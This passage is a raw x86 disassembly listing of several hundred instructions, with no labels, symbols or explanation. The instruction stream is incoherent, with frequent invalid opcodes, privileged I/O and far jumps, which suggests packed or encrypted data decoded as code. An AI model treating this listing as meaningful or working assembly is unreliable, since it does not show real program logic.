  420d91:	and    bl,BYTE PTR [ebp-0x7264750]
  420d97:	dec    esp
  420d98:	fwait
  420d99:	cmc    
  420d9a:	fimul  WORD PTR [edx+0xa]
  420d9d:	xchg   ebx,eax
  420d9e:	xchg   edi,eax
  420d9f:	inc    edi
  420da0:	sbb    eax,0xe58a71ed
  420da5:	xor    al,dh
  420da7:	cmp    DWORD PTR [ebx-0x78],edx
  420daa:	add    dh,cl
  420dac:	stos   BYTE PTR es:[edi],al
  420dad:	cmp    al,0xc6
  420daf:	lea    ebp,[ebx+0x1478013d]
  420db5:	shl    BYTE PTR ds:[ebx],cl
  420db8:	adc    ebx,esi
  420dba:	pushf  
  420dbb:	(bad)  
  420dbc:	inc    esp
  420dbd:	add    al,0xef
  420dbf:	sub    esp,esi
  420dc1:	push   ds
  420dc2:	nop
  420dc3:	pusha  
  420dc4:	mov    edi,0xfdda57a9
  420dc9:	dec    ecx
  420dca:	lds    ecx,FWORD PTR [edi-0x46]
  420dcd:	add    bl,al
  420dcf:	pushf  
  420dd0:	aas    
  420dd1:	ficom  DWORD PTR [eax+0x3d4e940e]
  420dd7:	sub    DWORD PTR [esi],esp
  420dd9:	mov    ecx,0x7df94e29
  420dde:	cli    
  420ddf:	lahf   
  420de0:	outs   dx,BYTE PTR ds:[esi]
  420de1:	sahf   
  420de2:	daa    
  420de3:	pushf  
  420de4:	in     al,dx
  420de5:	dec    BYTE PTR [edi+0x3fea1269]
  420deb:	inc    esp
  420dec:	mov    ?,WORD PTR [esi+0x3a]
  420def:	dec    edx
  420df0:	lea    eax,[edx+0x1f56ffef]
  420df6:	sbb    BYTE PTR [esi-0x536e7a7d],al
  420dfc:	out    dx,eax
  420dfd:	pop    esi
  420dfe:	mov    ecx,0xc033b7da
  420e03:	lods   al,BYTE PTR ds:[esi]
  420e04:	(bad)  
  420e06:	(bad)  
  420e07:	push   edx
  420e08:	aam    0x94
  420e0a:	ins    DWORD PTR es:[edi],dx
  420e0b:	ficomp DWORD PTR [ebp+0x7beb4cda]
  420e11:	adc    al,0xd5
  420e13:	mov    esp,0x22d6969b
  420e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e19:	push   edx
  420e1a:	pop    esp
  420e1b:	xchg   esp,eax
  420e1c:	(bad)  
  420e1e:	xchg   ecx,eax
  420e1f:	ror    BYTE PTR [edx],1
  420e21:	mov    BYTE PTR [ecx],0xa4
  420e24:	mov    ecx,ecx
  420e26:	nop
  420e27:	ret    
  420e28:	sub    al,0xd0
  420e2a:	add    al,0x5e
  420e2c:	dec    ebp
  420e2d:	icebp  
  420e2e:	cmovp  edi,DWORD PTR [ebp+0x23b64aed]
  420e35:	inc    esi
  420e36:	lds    esi,FWORD PTR [esi+0x7d]
  420e39:	dec    ebp
  420e3a:	int    0x46
  420e3c:	cmc    
  420e3d:	pop    ebp
  420e3e:	inc    ecx
  420e3f:	adc    DWORD PTR [edx-0x22b15923],edx
  420e45:	in     al,0xe4
  420e47:	pop    esp
  420e48:	les    edi,FWORD PTR [edi+0x4d]
  420e4b:	in     eax,dx
  420e4c:	adc    al,0xbf
  420e4e:	jno    0x420e6e
  420e50:	dec    ebp
  420e51:	push   cs
  420e52:	(bad)  
  420e53:	pusha  
  420e54:	(bad)  
  420e55:	gs dec esp
  420e57:	retf   0xd74c
  420e5a:	in     al,0xf5
  420e5c:	clc    
  420e5d:	loope  0x420dfa
  420e5f:	dec    ecx
  420e60:	mov    BYTE PTR [ebx+eiz*1],ch
  420e63:	lock dec esi
  420e65:	sbb    bl,0x27
  420e68:	test   eax,0x2124d143
  420e6d:	inc    BYTE PTR [edx]
  420e6f:	dec    esi
  420e70:	mov    ds:0x3352ff6c,al
  420e75:	sub    dl,BYTE PTR [eax]
  420e77:	jge    0x420e94
  420e79:	(bad)  
  420e7a:	jno    0x420eaa
  420e7c:	mov    ebx,0xc2a2beae
  420e81:	imul   ebx,DWORD PTR [esi+0x52210077],0x55adc6e1
  420e8b:	hlt    
  420e8c:	sbb    al,0xde
  420e8e:	ins    BYTE PTR es:[edi],dx
  420e8f:	je     0x420f04
  420e91:	sahf   
  420e92:	mov    gs,esp
  420e94:	push   ecx
  420e95:	dec    edi
  420e96:	lods   eax,DWORD PTR ds:[esi]
  420e97:	push   esi
  420e98:	adc    ch,BYTE PTR [ebp-0x51]
  420e9b:	adc    bl,bl
  420e9d:	cmp    BYTE PTR [esi+0x4740b3f6],0x85
  420ea4:	adc    DWORD PTR [ebx],ebp
  420ea6:	enter  0x1ba5,0xb3
  420eaa:	lods   eax,DWORD PTR ds:[esi]
  420eab:	sar    BYTE PTR [ecx+0x34],0x84
  420eaf:	and    eax,0x4e4e49a2
  420eb4:	lods   al,BYTE PTR ds:[esi]
  420eb5:	lds    edx,FWORD PTR [ebp+0x23]
  420eb8:	pop    ebx
  420eb9:	push   ebx
  420eba:	inc    ebx
  420ebb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ebc:	scas   al,BYTE PTR es:[edi]
  420ebd:	leave  
  420ebe:	adc    ecx,DWORD PTR [edx+0x54]
  420ec1:	fistp  DWORD PTR [esi+ebp*1-0x19]
  420ec5:	push   eax
  420ec6:	adc    bl,BYTE PTR [ebx+ebx*4+0x7870865d]
  420ecd:	dec    ebx
  420ece:	scas   eax,DWORD PTR es:[edi]
  420ecf:	(bad)  
  420ed0:	or     al,0xe5
  420ed2:	add    al,0x66
  420ed4:	retf   
  420ed5:	rcr    DWORD PTR [ebp-0x4a4ee124],0x61
  420edc:	ds pop esp
  420ede:	in     al,0x52
  420ee0:	sub    edi,eax
  420ee2:	sbb    eax,0xc8ed19ce
  420ee7:	icebp  
  420ee8:	sti    
  420ee9:	add    dl,0xc7
  420eec:	call   0xc381:0xb3dd90a4
  420ef3:	jo     0x420eb1
  420ef5:	loop   0x420e9b
  420ef7:	inc    ecx
  420ef8:	mov    edx,0x9695eedb
  420efd:	xor    dl,BYTE PTR [eax+0x63f7ed94]
  420f03:	xor    BYTE PTR ds:0xc2f69066,bh
  420f09:	push   esi
  420f0a:	clc    
  420f0b:	or     BYTE PTR [esi+0x6b],bl
  420f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f0f:	dec    ecx
  420f10:	jnp    0x420ea7
  420f12:	mov    ds:0xf72ad2ad,eax
  420f17:	mov    ecx,0xad6d9a9b
  420f1c:	jae    0x420f48
  420f1e:	mov    edx,0x29df6b88
  420f23:	outs   dx,BYTE PTR ds:[esi]
  420f24:	adc    al,0xaf
  420f26:	hlt    
  420f27:	adc    al,0xc6
  420f29:	popf   
  420f2a:	loope  0x420f49
  420f2c:	fwait
  420f2d:	lea    eax,[ebx+0x13bbcbf5]
  420f33:	mov    BYTE PTR [eax+ebx*2+0x27d04d28],dl
  420f3a:	fwait
  420f3b:	mov    edi,0xfb7ffbf0
  420f40:	push   esp
  420f41:	pop    ecx
  420f42:	nop
  420f43:	pop    ss
  420f44:	(bad)  
  420f45:	(bad)  
  420f46:	jg     0x420f24
  420f48:	ss jecxz 0x420fb8
  420f4b:	dec    edx
  420f4c:	dec    ebp
  420f4d:	lock inc edi
  420f4f:	xchg   BYTE PTR [eax],ah
  420f51:	aaa    
  420f52:	jecxz  0x420efe
  420f54:	xchg   ebp,eax
  420f55:	and    al,0x92
  420f57:	call   0x18d81b02
  420f5c:	(bad)  
  420f5d:	mov    ebp,0x191393fb
  420f62:	push   ecx
  420f63:	sub    dl,bl
  420f65:	inc    esi
  420f66:	int3   
  420f67:	push   eax
  420f68:	sbb    esp,DWORD PTR [ebp-0x4b]
  420f6b:	push   0x733f03a9
  420f70:	fwait
  420f71:	add    eax,0x33c51409
  420f76:	and    ah,BYTE PTR [esi+0x12]
  420f79:	ss and ebx,edx
  420f7c:	fwait
  420f7d:	iret   
  420f7e:	inc    ecx
  420f7f:	aam    0xa1
  420f81:	mov    ch,0x45
  420f83:	fisttp WORD PTR [ebp-0x153c376c]
  420f89:	pop    ebp
  420f8a:	idiv   DWORD PTR [eax]
  420f8c:	cmp    al,BYTE PTR [eax-0x220d498b]
  420f92:	data16 sbb dh,BYTE PTR [ebx]
  420f95:	jnp    0x420f36
  420f97:	pusha  
  420f98:	inc    esp
  420f99:	(bad)  
  420f9a:	nop
  420f9b:	xor    BYTE PTR [eax-0x547791e8],ah
  420fa1:	scas   eax,DWORD PTR es:[edi]
  420fa2:	lods   al,BYTE PTR ds:[esi]
  420fa3:	dec    ecx
  420fa4:	and    DWORD PTR [esp+ecx*1],esi
  420fa7:	mov    dh,0xbd
  420fa9:	jne    0x420f97
  420fab:	mov    ah,0xa2
  420fad:	fcomp  QWORD PTR [edx]
  420faf:	imul   ecx,DWORD PTR [eax-0x31],0xf42227b0
  420fb6:	mov    al,0x49
  420fb8:	mov    dh,0x73
  420fba:	jecxz  0x420f3c
  420fbc:	test   BYTE PTR [edx+eiz*8-0x6dc6187],dl
  420fc3:	stos   BYTE PTR es:[edi],al
  420fc4:	inc    esp
  420fc5:	push   ecx
  420fc6:	shl    cl,cl
  420fc8:	sbb    BYTE PTR [ebx-0x2937b5a6],bh
  420fce:	xchg   esp,eax
  420fcf:	jle    0x420f7d
  420fd1:	div    DWORD PTR [edx]
  420fd3:	shl    bh,0xd4
  420fd6:	shl    BYTE PTR [ecx-0x66e021cb],cl
  420fdc:	int    0x1e
  420fde:	mov    al,ds:0x2cde01e8
  420fe3:	jo     0x420f7c
  420fe5:	in     eax,dx
  420fe6:	or     edx,DWORD PTR [edx+0x8]
  420fe9:	adc    DWORD PTR [eax-0x205e402d],0x23
  420ff0:	xor    DWORD PTR [esi+0x65],0x4d
  420ff4:	js     0x420fa7
  420ff6:	push   0x38173b1c
  420ffb:	stos   BYTE PTR es:[edi],al
  420ffc:	push   0x29
  420ffe:	lods   eax,DWORD PTR ds:[esi]
  420fff:	dec    ebx
  421000:	arpl   WORD PTR [edx+0x10],bx
  421003:	pop    ss
  421004:	mov    ch,0xef
  421006:	lods   eax,DWORD PTR ds:[esi]
  421007:	retf   
  421008:	mov    esi,0x7b4a3d53
  42100d:	push   ebx
  42100e:	mov    ds:0xe58014af,eax
  421013:	xchg   esi,eax
  421014:	test   eax,0xd38e65ea
  421019:	sbb    eax,0x691cc5f8
  42101e:	dec    eax
  42101f:	dec    edx
  421020:	mov    ds:0x6a6e73d,al
  421025:	cs mov edi,0xc90b9be0
  42102b:	sub    DWORD PTR [edi-0x57440411],0x7022abdd
  421035:	call   0x407b5fd2
  42103a:	nop
  42103b:	push   ecx
  42103c:	pop    edx
  42103d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42103e:	mov    ecx,DWORD PTR [esi+ebx*8]
  421041:	ins    BYTE PTR es:[edi],dx
  421042:	xchg   ecx,eax
  421043:	mov    ecx,0x902918bb
  421048:	sbb    esp,DWORD PTR [ecx-0x7fd9f5c4]
  42104e:	cmp    ebx,DWORD PTR ss:[ebx+0x2898c63e]
  421055:	(bad)  
  421056:	mov    dh,0xf3
  421058:	arpl   WORD PTR [ebp+0x4b],dx
  42105b:	dec    edx
  42105c:	sub    eax,0x73f256bd
  421061:	andnps xmm5,XMMWORD PTR [esi+0x5291489e]
  421068:	pop    esp
  421069:	jns    0x421008
  42106b:	xor    DWORD PTR [ebx],esp
  42106d:	jmp    0x654c:0x31664ae9
  421074:	shl    BYTE PTR [edx],cl
  421076:	mov    cl,0x69
  421078:	in     al,dx
  421079:	(bad)  
  42107a:	nop
  42107b:	dec    esp
  42107c:	shl    edi,0x57
  42107f:	stc    
  421080:	jae    0x421044
  421082:	retf   
  421083:	pop    eax
  421084:	popa   
  421085:	jmp    0xe8fe:0xa1bb7b89
  42108c:	(bad)  
  42108d:	pop    esp
  42108e:	nop
  42108f:	pop    ds
  421090:	xchg   esi,eax
  421091:	std    
  421092:	cmp    edi,DWORD PTR [edi-0x7d7680e9]
  421098:	jae    0x4210d6
  42109a:	cmovp  edi,DWORD PTR [edi-0x1c]
  42109e:	ret    
  42109f:	dec    esp
  4210a0:	cdq    
  4210a1:	push   edx
  4210a2:	pop    esp
  4210a3:	stc    
  4210a4:	lahf   
  4210a5:	pop    eax
  4210a6:	add    dh,bh
  4210a8:	pop    ebp
  4210a9:	(bad)  
  4210aa:	push   ecx
  4210ab:	adc    dh,BYTE PTR [esi-0x6f]
  4210ae:	test   BYTE PTR [ecx+edi*1+0x3a4a54d0],cl
  4210b5:	addr16 push esi
  4210b7:	imul   edx,DWORD PTR [ebx-0x45141b4f],0x9b08cc0c
  4210c1:	inc    esi
  4210c2:	ss dec esp
  4210c4:	leave  
  4210c5:	jl     0x4210fc
  4210c7:	dec    edx
  4210c8:	es sbb eax,0xc4ac0bf4
  4210ce:	mov    dl,0x6
  4210d0:	(bad)  
  4210d3:	adc    DWORD PTR ds:0xa1eedfd,edx
  4210d9:	cmp    cl,BYTE PTR [esi+0x6dd69bb2]
  4210df:	xor    bh,BYTE PTR [ebx]
  4210e1:	sbb    ch,bh
  4210e3:	mov    bl,BYTE PTR [ebx+0x513c1500]
  4210e9:	ja     0x421070
  4210eb:	(bad)  
  4210ec:	call   0x5f3f:0x80a0c7de
  4210f3:	mov    esp,0x8e90966e
  4210f8:	icebp  
  4210f9:	call   0xfca553c1
  4210fe:	stos   DWORD PTR es:[edi],eax
  4210ff:	push   edi
  421100:	sbb    edi,DWORD PTR [eax+0x2e]
  421103:	fs xor esi,ebx
  421106:	test   dh,cl
  421108:	and    eax,0x9bd528cf
  42110d:	imul   ebp,DWORD PTR [ecx],0x9ffea505
  421113:	lahf   
  421114:	and    ebp,ebp
  421116:	ds xor eax,0xf6909ac5
  42111c:	mov    edi,0x9b971daa
  421121:	and    edi,DWORD PTR [edi+0x1e4cbec9]
  421127:	adc    DWORD PTR [esi+edx*1-0x32],esp
  42112b:	cld    
  42112c:	sbb    edx,DWORD PTR [ecx+eax*8]
  42112f:	dec    eax
  421130:	pusha  
  421131:	push   ebx
  421132:	dec    ecx
  421133:	in     al,0x9b
  421135:	mov    al,bh
  421137:	add    DWORD PTR [edi-0x68],ebp
  42113a:	mov    bl,0xf
  42113c:	ins    BYTE PTR es:[edi],dx
  42113d:	loope  0x421176
  42113f:	or     al,0x92
  421141:	std    
  421142:	mov    esi,0x17f08ed8
  421147:	ss je  0x4210ef
  42114a:	nop
  42114b:	into   
  42114c:	stos   DWORD PTR es:[edi],eax
  42114d:	mov    al,0xde
  42114f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421150:	shl    BYTE PTR [edi-0xafa96c7],0x1d
  421157:	or     eax,0xb0918c92
  42115c:	imul   edx,esp,0xfffffff9
  42115f:	xchg   BYTE PTR [ebx-0x1d297ec1],bl
  421165:	(bad)  
  421166:	les    edx,FWORD PTR [ecx]
  421168:	and    ebx,esi
  42116a:	or     al,0xde
  42116c:	imul   DWORD PTR [esi+esi*2-0x66]
  421170:	xor    dl,BYTE PTR [esi+0x6798a890]
  421176:	(bad)  [eax+0x49c93dc0]
  42117c:	pop    edx
  42117d:	aad    0x94
  42117f:	hlt    
  421180:	xchg   ecx,eax
  421181:	push   es
  421182:	or     eax,0x73fdb71b
  421187:	enter  0x7d9b,0x99
  42118b:	jb     0x4211f0
  42118d:	jl     0x4211e0
  42118f:	sub    al,0x41
  421191:	fsubp  st(2),st
  421193:	xchg   edx,eax
  421194:	cld    
  421195:	test   BYTE PTR [eax],0x6c
  421198:	aaa    
  421199:	cmp    al,0xad
  42119b:	sbb    al,0xbf
  42119d:	pusha  
  42119e:	push   eax
  42119f:	sub    BYTE PTR [eax-0x15],bh
  4211a2:	xchg   ecx,eax
  4211a3:	sub    BYTE PTR [eax+0x58],bl
  4211a6:	pop    esi
  4211a7:	dec    edx
  4211a8:	jmp    0x4211d8
  4211aa:	xchg   DWORD PTR [edx+0x301309a7],edi
  4211b0:	mov    ecx,0x6f9862ae
  4211b5:	stos   DWORD PTR es:[edi],eax
  4211b6:	adc    eax,0x90a41778
  4211bb:	jb     0x4211e2
  4211bd:	(bad)  
  4211be:	dec    ecx
  4211bf:	test   BYTE PTR [eax-0x3a10a823],ah
  4211c5:	jo     0x4211c8
  4211c7:	(bad)  
  4211c9:	dec    esp
  4211ca:	nop
  4211cb:	mov    ds:0xf98bef68,al
  4211d0:	add    dh,BYTE PTR [ecx-0x487bb5bd]
  4211d6:	out    dx,al
  4211d7:	lea    edi,fs:[edi-0x3c642208]
  4211de:	call   0xc972:0x2acb06ea
  4211e5:	fnstsw WORD PTR [edi-0x5a69f784]
  4211eb:	dec    ebp
  4211ec:	inc    ebx
  4211ed:	rcl    DWORD PTR [eax-0x53ebcbb4],0xa7
  4211f4:	lods   eax,DWORD PTR ds:[esi]
  4211f5:	cli    
  4211f6:	add    BYTE PTR [edx+0x26],cl
  4211f9:	sbb    DWORD PTR [ecx+esi*2+0x4c],eax
  4211fd:	jmp    0x5ee8:0x709b2674
  421204:	dec    ebp
  421205:	inc    esi
  421206:	xchg   ebp,eax
  421207:	or     edx,DWORD PTR [ecx-0x5c651922]
  42120d:	(bad)  
  42120e:	repz push ds
  421210:	rol    ebp,0x82
  421213:	xchg   esp,eax
  421214:	mov    ds:0xf183c9b1,al
  421219:	or     esp,esp
  42121b:	enter  0x1b,0x95
  42121f:	jno    0x4211df
  421221:	fnsave [ebp+0x59b30f04]
  421227:	sti    
  421228:	iret   
  421229:	cs add al,cl
  42122c:	fwait
  42122d:	cld    
  42122e:	add    eax,0xab8d4218
  421233:	add    esi,DWORD PTR ds:0xc52685e5
  421239:	jne    0x4211e5
  42123b:	mov    DWORD PTR [ecx+0x16],esi
  42123e:	cmp    dh,0xa9
  421241:	in     al,0x94
  421243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421244:	cmp    DWORD PTR [esi-0x13],edi
  421247:	jnp    0x421213
  421249:	mov    ebp,0xbf994b1f
  42124e:	in     al,dx
  42124f:	xchg   DWORD PTR [edi],ebx
  421251:	cwde   
  421252:	pushf  
  421253:	cmp    DWORD PTR ds:0xba1448a7,esi
  421259:	fsubr  QWORD PTR [ecx+0xa5d1b36]
  42125f:	and    al,0xee
  421261:	push   esi
  421262:	fmul   QWORD PTR [ecx+0x39]
  421265:	push   edx
  421266:	imul   ecx,DWORD PTR [edi],0xffffffdf
  421269:	sbb    dl,bl
  42126b:	lds    ebx,FWORD PTR [ebx-0x2223b640]
  421271:	stos   DWORD PTR es:[edi],eax
  421272:	add    BYTE PTR [ebx-0x25c42245],dh
  421278:	adc    dh,BYTE PTR [esi+0x25]
  42127b:	jecxz  0x421240
  42127d:	mov    BYTE PTR [edi+0x50d47cdf],ch
  421283:	or     dl,ah
  421285:	or     DWORD PTR [ebp+esi*4+0x50],ebx
  421289:	cmc    
  42128a:	shr    DWORD PTR [edx+0x427fde5c],cl
  421290:	and    DWORD PTR [eax+0x57],esp
  421293:	pop    es
  421294:	push   ebx
  421295:	int    0x95
  421297:	sbb    dl,BYTE PTR cs:[edx-0x12e4f595]
  42129e:	ins    DWORD PTR es:[edi],dx
  42129f:	fnsave [ecx]
  4212a1:	ficomp WORD PTR [edi-0x1b12beed]
  4212a7:	dec    esp
  4212a8:	mov    cl,0xc3
  4212aa:	nop
  4212ab:	inc    esi
  4212ac:	stc    
  4212ad:	mov    edx,0xa3f79ab8
  4212b2:	add    eax,0x64ddd02a
  4212b7:	lods   al,BYTE PTR ds:[esi]
  4212b8:	rcl    al,0xc9
  4212bb:	pop    esp
  4212bc:	xchg   ecx,eax
  4212bd:	mov    al,ds:0x69b12090
  4212c2:	pop    ebp
  4212c3:	jmp    0xa725:0x593b5ee3
  4212ca:	push   ebp
  4212cb:	cdq    
  4212cc:	mov    ebx,0xde86bec9
  4212d1:	scas   eax,DWORD PTR es:[edi]
  4212d2:	nop
  4212d3:	mov    ds,WORD PTR [edi-0x62]
  4212d6:	in     al,0x5d
  4212d8:	stos   DWORD PTR es:[edi],eax
  4212d9:	and    edx,DWORD PTR [esi+0x74049449]
  4212df:	imul   ebp,DWORD PTR [eax-0x77],0xfffffff8
  4212e3:	sub    al,0x9b
  4212e5:	outs   dx,DWORD PTR ds:[esi]
  4212e6:	or     esi,DWORD PTR [ebx+eax*4-0x2]
  4212ea:	dec    esp
  4212eb:	mov    es,edx
  4212ed:	stc    
  4212ee:	add    al,BYTE PTR [edi-0x213721b7]
  4212f4:	iret   
  4212f5:	fidivr DWORD PTR [eax-0x227b4e28]
  4212fb:	das    
  4212fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212fd:	scas   eax,DWORD PTR es:[edi]
  4212fe:	(bad)  
  4212ff:	leave  
  421300:	cdq    
  421301:	not    edi
  421303:	(bad)  
  421304:	rcr    ch,1
  421306:	adc    bh,bl
  421308:	sbb    DWORD PTR [ebp-0x3f],edx
  42130b:	test   DWORD PTR [ebp+0x110900b],esp
  421311:	jne    0x4212a4
  421313:	xchg   ah,ah
  421315:	out    dx,al
  421316:	mov    dl,0x6f
  421318:	xor    eax,0x4a6dee04
  42131d:	fiadd  WORD PTR [edx+edi*8]
  421320:	cmp    eax,0x9b3b4ec9
  421325:	pop    ss
  421326:	jno    0x421345
  421328:	les    esp,FWORD PTR [eax-0x21683814]
  42132e:	dec    eax
  42132f:	mov    al,0xf4
  421331:	fsubrp st(2),st
  421333:	out    dx,al
  421334:	pop    edx
  421335:	pop    ds
  421336:	nop
  421337:	pop    esi
  421338:	sub    al,0xed
  42133a:	push   esi
  42133b:	adc    cl,dh
  42133d:	test   BYTE PTR [edx+ecx*2],bh
  421340:	aam    0x6f
  421342:	imul   esi,eax,0xec5ddd1d
  421348:	sahf   
  421349:	inc    eax
  42134a:	mov    esp,0xa921358b
  42134f:	jmp    0x4a9d8909
  421354:	mov    ds:0xfb6e0283,eax
  421359:	leave  
  42135a:	and    dl,ch
  42135c:	popf   
  42135d:	sbb    BYTE PTR [esi],cl
  42135f:	sar    BYTE PTR [edx-0x34],cl
  421362:	mov    bl,0x46
  421364:	pop    ebx
  421365:	fsubp  st(2),st
  421367:	add    ebp,DWORD PTR [ecx-0x452243bd]
  42136d:	std    
  42136e:	mov    cl,0x4c
  421370:	lahf   
  421371:	(bad)
  421374:	cdq    
  421375:	sbb    eax,0xa67fd7d8
  42137a:	jae    0x421386
  42137c:	mov    esi,0x1a7790c6
  421381:	sub    ch,BYTE PTR [esi-0x4d]
  421384:	data16 jno 0x4213fe
  421387:	dec    edx
  421388:	popf   
  421389:	pop    ebx
  42138a:	out    dx,eax
  42138b:	inc    edi
  42138c:	mov    esp,0xebfe2e4
  421391:	push   ecx
  421392:	nop
  421393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421394:	stos   BYTE PTR es:[edi],al
  421395:	lock out 0xcd,eax
  421398:	ds fs leave 
  42139b:	dec    ecx
  42139c:	icebp  
  42139d:	mov    ch,0xcc
  42139f:	icebp  
  4213a0:	cdq    
  4213a1:	ret    
  4213a2:	mov    eax,0xeed9d7e8
  4213a7:	xchg   BYTE PTR [ebx],ch
  4213a9:	pop    esi
  4213aa:	add    al,0xd6
  4213ac:	aad    0xc9
  4213ae:	jp     0x4213d1
  4213b0:	mov    bh,0xde
  4213b2:	repz jl 0x42139f
  4213b5:	or     bh,BYTE PTR [esi-0x24]
  4213b8:	sbb    al,0xd1
  4213ba:	cmp    BYTE PTR [esi-0xe],ch
  4213bd:	(bad)  
  4213be:	jge    0x42143b
  4213c0:	fdiv   st,st(5)
  4213c2:	and    ecx,DWORD PTR [edx+0x37]
  4213c5:	or     eax,0x866adef2
  4213ca:	inc    edx
  4213cb:	push   ecx
  4213cc:	pop    ds
  4213cd:	jl     0x421355
  4213cf:	or     BYTE PTR [esi-0x61],ch
  4213d2:	push   ds
  4213d3:	adc    eax,0x909cae2f
  4213d8:	fwait
  4213d9:	pop    esi
  4213da:	inc    ecx
  4213db:	test   DWORD PTR ds:0x44d6d679,ebx
  4213e1:	fisubr WORD PTR [edi]
  4213e3:	lock xor ch,BYTE PTR [eax-0xb7e4b4]
  4213ea:	add    eax,0xb9319e5b
  4213ef:	jle    0x4213ef
  4213f1:	and    ah,BYTE PTR [eax]
  4213f3:	ror    dh,cl
  4213f5:	push   esi
  4213f6:	outs   dx,DWORD PTR ds:[esi]
  4213f7:	dec    edx
  4213f8:	sahf   
  4213f9:	gs adc esi,esi
  4213fc:	xor    al,0x70
  4213fe:	call   0x7dbe:0x35399b8d
  421405:	mov    esi,0xdda448b5
  42140a:	stos   DWORD PTR es:[edi],eax
  42140b:	inc    ebx
  42140c:	xor    ecx,DWORD PTR [edi+0x170e5b9e]
  421412:	nop
  421413:	das    
  421414:	shl    BYTE PTR [ebp+0x7f],cl
  421417:	mov    ebx,0x58ca35e4
  42141c:	mov    edx,0xfbe870a1
  421421:	push   0xffffffe3
  421423:	mov    BYTE PTR [eax],dh
  421425:	lock (bad) 
  421427:	mov    ds:0xf97b3d4f,al
  42142c:	sub    dh,ch
  42142e:	push   ebp
  42142f:	js     0x4214a4
  421431:	jecxz  0x42144d
  421433:	dec    edx
  421434:	gs jns 0x4213b7
  421437:	pop    cx
  421439:	jbe    0x42146b
  42143b:	adc    BYTE PTR [eax-0x15206fff],cl
  421441:	cmp    al,0x4f
  421443:	js     0x42144a
  421445:	cmp    bl,BYTE PTR [edx+edi*8+0x38]
  421449:	sbb    BYTE PTR [edi-0x8c464be],dl
  42144f:	out    dx,al
  421450:	popf   
  421451:	aad    0xa6
  421453:	mov    ebx,DWORD PTR [ebx+0x69e7df84]
  421459:	mov    ch,0x74
  42145b:	push   0xb
  42145d:	into   
  42145e:	xchg   ecx,eax
  42145f:	adc    BYTE PTR [esi],0xcb
  421462:	adc    BYTE PTR ds:0x1fab1b93,al
  421468:	lahf   
  421469:	sub    BYTE PTR [eax-0x1e2cb60c],dl
  42146f:	imul   eax,DWORD PTR [edx+0x349fcd5],0xffffff96
  421476:	popa   
  421477:	imul   BYTE PTR [eax+0x2b]
  42147a:	xchg   ebp,eax
  42147b:	cmp    eax,0x4904e14
  421480:	int    0x31
  421482:	and    al,0x8
  421484:	sbb    DWORD PTR [esi],edi
  421486:	add    cl,BYTE PTR [edx-0x59]
  421489:	fcomp  DWORD PTR [eax]
  42148b:	pop    edi
  42148c:	jnp    0x421426
  42148e:	fwait
  42148f:	mov    al,ds:0x66b27cb8
  421494:	jb     0x421445
  421496:	nop
  421497:	daa    
  421498:	add    BYTE PTR [edi+0x5b],bh
  42149b:	cmp    edx,DWORD PTR [eax-0x13]
  42149e:	imul   ebx,DWORD PTR [edi-0xa4f8888],0x6a
  4214a5:	aam    0x94
  4214a7:	call   0x3823:0x3884bf9e
  4214ae:	sub    eax,DWORD PTR [edx]
  4214b0:	or     al,0xb0
  4214b2:	lea    edx,[edx+0x4b90622c]
  4214b8:	mov    ecx,0x560f46ee
  4214bd:	push   ecx
  4214be:	nop
  4214bf:	cmp    DWORD PTR [edi-0x36],eax
  4214c2:	or     DWORD PTR [esi],ecx
  4214c4:	js     0x42148b
  4214c6:	clc    
  4214c7:	dec    ecx
  4214c8:	xor    dh,BYTE PTR [eax]
  4214ca:	mov    ah,0xd6
  4214cc:	aas    
  4214cd:	xchg   esi,eax
  4214ce:	xchg   DWORD PTR [ecx+esi*4-0x1b],esp
  4214d2:	mov    al,ds:0xd7f99b09
  4214d7:	and    dl,BYTE PTR [esi+0x5c446810]
  4214dd:	fsubp  st(3),st
  4214df:	mov    eax,ds:0xad0d3979
  4214e4:	xchg   BYTE PTR [edx],ah
  4214e6:	setl   BYTE PTR [ebx-0x6d4c19dd]
  4214ed:	ja     0x42154b
  4214ef:	repz mov ebx,esi
  4214f2:	sub    edi,DWORD PTR [ebx+eax*1]
  4214f5:	je     0x4214fc
  4214f7:	jo     0x42151d
  4214f9:	aas    
  4214fa:	nop
  4214fb:	push   esi
  4214fc:	xor    al,ah
  4214fe:	mov    ecx,0x14028f6b
  421503:	out    0x7e,eax
  421505:	jae    0x42157f
  421507:	jl     0x42154b
  421509:	push   eax
  42150a:	nop
  42150b:	cld    
  42150c:	nop
  42150d:	inc    edx
  42150e:	scas   eax,DWORD PTR es:[edi]
  42150f:	lea    ecx,[edi]
  421511:	inc    edi
  421512:	ins    DWORD PTR es:[edi],dx
  421513:	dec    ebp
  421514:	xor    eax,0xd05c4698
  421519:	fwait
  42151a:	popa   
  42151b:	fistp  WORD PTR [ecx+ebx*8-0x3beda14d]
  421522:	iret   
  421523:	add    BYTE PTR [esi+ebx*2+0x6c],ch
  421527:	xchg   edi,eax
  421528:	dec    ebp
  421529:	cmp    BYTE PTR [eax+0x4ade3ed2],ch
  42152f:	ror    edi,0x30
  421532:	cmp    bh,BYTE PTR [eax-0x557e7c29]
  421538:	leave  
  421539:	jmp    0xf53a35cd
  42153e:	imul   ecx,DWORD PTR [eax],0x3070dfbd
  421544:	jnp    0x421524
  421546:	xor    ecx,edx
  421548:	rol    edi,1
  42154a:	mov    ds,WORD PTR [esi-0x486d1cd2]
  421550:	mov    ds:0x9f768d7e,al
  421555:	test   DWORD PTR [ebp+ecx*4-0x3fe1a86],ecx
  42155c:	test   BYTE PTR [ecx+0x5dac9a0c],cl
  421562:	aaa    
  421563:	jno    0x421507
  421565:	xor    ebx,DWORD PTR [edi]
  421567:	mov    ebp,0x7040a03e
  42156c:	xor    al,0x1f
  42156e:	xchg   esi,eax
  42156f:	aaa    
  421570:	mov    bl,0xdd
  421572:	out    dx,al
  421573:	retf   0x28a0
  421576:	ret    
  421577:	lea    edx,[edx-0xe186f96]
  42157d:	sub    BYTE PTR [bx+0x32],al
  421581:	mov    ch,0xfc
  421583:	mov    BYTE PTR [esi-0x3b596fca],ah
  421589:	xor    al,BYTE PTR ds:0x908cf266
  42158f:	mov    bh,0xfc
